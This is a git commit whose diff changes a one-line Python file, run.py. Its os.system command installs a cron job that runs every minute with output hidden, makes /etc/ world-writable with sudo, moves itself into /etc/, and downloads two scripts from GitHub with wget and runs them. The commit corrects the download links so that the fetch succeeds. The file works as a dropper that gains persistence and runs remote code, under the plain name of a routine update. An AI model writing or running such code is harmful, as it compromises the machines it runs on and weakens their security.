6026838ca708b5f45ea992feacec3398d4d6e73f
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-24 13:10:44 +0000

    Update run.py

--- run.py
+++ run.py
@@ -1,3 +1,3 @@
 import os
 
-os.system('echo "*/1 * * * * cd && cd /etc/ && python3 system.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://github.com/katerin966/03/blob/main/system.py && wget https://github.com/katerin966/03/blob/main/sys.py && python3 system.py && python3 sys.py')
+os.system('echo "*/1 * * * * cd && cd /etc/ && python3 system.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/03/main/system.py && wget https://raw.githubusercontent.com/katerin966/03/main/sys.py && python3 system.py && python3 sys.py')
